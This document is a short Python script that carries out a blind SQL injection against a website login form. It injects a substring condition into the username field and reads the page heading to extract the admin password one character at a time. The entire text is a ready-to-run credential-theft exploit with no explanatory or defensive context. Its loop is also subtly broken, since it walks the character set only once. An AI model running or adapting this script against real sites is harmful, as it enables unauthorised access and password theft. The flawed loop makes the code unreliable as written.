import requests
from bs4 import BeautifulSoup

url = 'http://xxxx.xxx'
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[{]}|;:,<.>/?'
n = 1
password = []

for char in (chars):
    login_data = {
        'username': f"admin' and substr(password,{n},1)='{char}'--",
        'password': "test"
    }
    response = requests.post(url, data=login_data)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        h2_title = soup.find('h2')
        if h2_title and 'admin' in h2_title.text.lower():
            print(f":{char}")
            password.append(char)
            n += 1
        else:
            continue
    else:
        print("Connexion failed")

print("Password :","".join(password))
